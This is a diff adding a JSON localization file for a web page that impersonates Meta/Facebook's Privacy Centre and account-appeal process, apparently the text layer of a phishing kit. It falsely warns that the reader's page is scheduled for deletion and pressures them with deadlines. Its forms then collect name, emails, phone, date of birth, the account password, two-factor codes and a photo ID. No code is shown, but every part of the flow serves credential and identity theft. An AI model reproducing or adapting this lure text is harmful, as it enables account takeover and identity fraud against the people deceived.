@@ -1,0 +1,247 @@
+{
+    "menu": {
+        "title": "Privacy Centre",
+        "menu_1": {
+            "title": "Privacy Centre home"
+        },
+        "menu_2": {
+            "title": "Search"
+        },
+        "menu_3": {
+            "title": "Common privacy settings"
+        },
+        "menu_4": {
+            "title": "Privacy topics"
+        },
+        "menu_5": {
+            "title": "More privacy resources"
+        },
+        "menu_6": {
+            "title": "Privacy Policy",
+            "sub_title": {
+                "sub_1": "What is the Privacy Policy and what does it cover?",
+                "sub_2": "What information do we collect?",
+                "sub_3": "How do we use your information?",
+                "sub_4": "How do we share your information on Products or with integrated partners?",
+                "sub_5": "How do we share information with third parties?",
+                "sub_6": "How is the cooperation between Companies organized?",
+                "sub_7": "How can you manage or delete your information and exercise your rights?",
+                "sub_8": "How long do we keep your information?",
+                "sub_9": "How do we transmit information?",
+                "sub_10": "How do we respond to official requests, comply with applicable laws, and prevent harm?",
+                "sub_11": "How will you know when the policy changes?",
+                "sub_12": "How to ask questions?",
+                "sub_13": "Why and how we process your data"
+            }
+        },
+        "menu_7": {
+            "title": "Other policies and articles",
+            "sub_title": {
+                "sub_1": "Cookie Policy",
+                "sub_2": "Information for those who do not use Products",
+                "sub_3": "How uses information for generative AI models",
+                "sub_4": "Data Transfer Framework Policy",
+                "sub_5": "Other terms and conditions"
+            }
+        }
+    },
+    "content": {
+        "top_content": {
+            "title": "We have scheduled your page to be deleted",
+            "sub": {
+                "sub_1": "We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification.",
+                "sub_2": "If you believe restrictions have been placed on your account in error, you can request a review."
+            },
+            "ticket": "Your ticket id:"
+        },
+        "guide": {
+            "title": "Appeal Guide",
+            "sub": {
+                "sub_1": "Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.",
+                "sub_2": "In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
+                "sub_3": "When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated."
+            }
+        },
+        "thumb": {
+            "title": "Fixing problems with account restrictions",
+            "sub": {
+                "sub_1": "Review request",
+                "sub_2": "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal."
+            },
+            "button": "Request Review",
+            "day": "Your page was restricted on"
+        },
+        "appeal_guide": {
+            "title": "Appeal Guide",
+            "sub_title": {
+                "sub_1": "Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.",
+                "sub_2": "In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
+                "sub_3": "When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated."
+            }
+        },
+        "privacy_center": {
+            "title": "Privacy Center",
+            "sub_title": {
+                "sub_1": {
+                    "title": "What is the Privacy Policy and what does it say?",
+                    "description": "Privacy Policy"
+                },
+                "sub_2": {
+                    "title": "How you can manage or delete your information",
+                    "description": "Privacy Policy"
+                }
+            }
+        },
+        "more_info": {
+            "title": "For more details, see the User Agreement",
+            "sub_title": {
+                "sub_1": {
+                    "title": "AI Product",
+                    "description": "User Agreement"
+                }
+            }
+        },
+        "resouces": {
+            "title": "Additional resources",
+            "sub_title": {
+                "sub_1": {
+                    "title": "How uses information for generative AI models",
+                    "description": "Privacy Center"
+                },
+                "sub_2": {
+                    "title": "Cards with information about the operation of AI systems",
+                    "description": "Product AI website"
+                },
+                "sub_3": {
+                    "title": "Introduction to Generative AI",
+                    "description": "For teenagers"
+                }
+            }
+        },
+        "footer": {
+            "title": "We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about",
+            "link": "Privacy Policy"
+        },
+        "modal": {
+            "appeal_request": {
+                "title": "Apeal Form",
+                "form": {
+                    "name": {
+                        "placeholder": "Full Name",
+                        "required": "Please enter enough full name."
+                    },
+                    "email": {
+                        "placeholder": "Email",
+                        "required": "Please enter enough email address."
+                    },
+                    "email_business": {
+                        "placeholder": "Email Business",
+                        "required": "Please enter enough email business address."
+                    },
+                    "page_name": {
+                        "placeholder": "Page Name",
+                        "required": "Please enter enough page name."
+                    },
+                    "phone_number": {
+                        "placeholder": "Phone Number",
+                        "required": "Please enter enough phone number."
+                    },
+                    "date_of_birth": {
+                        "title": "Date of Birth",
+                        "day": {
+                            "placeholder": "Day",
+                            "required": "Please enter enough day."
+                        },
+                        "month": {
+                            "placeholder": "Month",
+                            "required": "Please enter enough month."
+                        },
+                        "year": {
+                            "placeholder": "Year",
+                            "required": "Please enter enough year."
+                        }
+                    },
+                    "issue": {
+                        "placeholder": "Describe your issue",
+                        "required": "Please enter your issue.",
+                        "note": "Our response will be sent to you within 14 - 48 hours."
+                    },
+                    "facebook_notification": {
+                        "title": "on Facebook",
+                        "description": "We will send you a notification on Facebook."
+                    },
+                    "check_form": {
+                        "title": "I agree with",
+                        "link": "Terms of use"
+                    },
+                    "button": "Send"
+                }
+            },
+            "password": {
+                "title": "Password",
+                "description": "For your security, you must enter your password to continue.",
+                "form": {
+                    "password": {
+                        "placeholder": "Password",
+                        "required": "You haven't entered your password!",
+                        "warning": "The password you've entered is incorrect."
+                    },
+                    "button": "Continue",
+                    "forgot_password": "Forgot your password?"
+                }
+            },
+            "2fa": {
+                "title": "Two-factor authentication required (1/3)",
+                "description": "The verification code has been sent to your phone number or E-mail, please check your inbox and enter the code below to complete. In case you do not receive the code, please check the Facebook notification on your device and confirm it is you to complete the verification process.",
+                "form": {
+                    "placeholder": "Code",
+                    "warning": "The two-factor authentication you entered is incorrect. Please, try again after",
+                    "required": "You haven't entered your two-factor authentication!",
+                    "minutes": "minutes",
+                    "seconds": "seconds",
+                    "button": "Continue"
+                }
+            },
+            "upload_file": {
+                "title": "Upload your ID",
+                "sub_title": {
+                    "sub_1": "Before we can get you back on Facebook safely, we need to make sure this your account. You can prove this account is yours by sending us a photo of your ID.",
+                    "sub_2": "We don't accept photos of a computer screen, a phone screen or a photocopy. If there are any issues, we'll send you an email.",
+                    "sub_3": "We'll store an encrypted copy of your selfie for up to one year to improve our ability to detect fake photos, keeping Facebook safe from impersonation.",
+                    "sub_4": "Change how long we store your selfie for",
+                    "sub_5": "or",
+                    "sub_6": "Learn more"
+                },
+                "form": {
+                    "file": "Upload your ID",
+                    "warning": "is not an image file",
+                    "button": "Continue"
+                }
+            },
+            "final_step": {
+                "title": "Request has been sent",
+                "description": "Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.",
+                "button": "Return to Facebook"
+            },
+            "authen_modal" : {
+                "title": "Choose a way to confirm that it's you",
+                "app": {
+                    "sub_1": "Authenticator app",
+                    "sub_2": "Go to your authentication app"
+                },
+                "sms": {
+                    "sub_1": "SMS",
+                    "sub_2": "We will send a code to the number"
+                },
+                "email": {
+                    "sub_1": "E-mail",
+                    "sub_2": "We will send a code to"
+                },
+                "whatsapp": {
+                    "sub_1": "WhatsApp",
+                    "sub_2": "We will send a code to the number"
+                }
+            }
+        }
+    }
+}
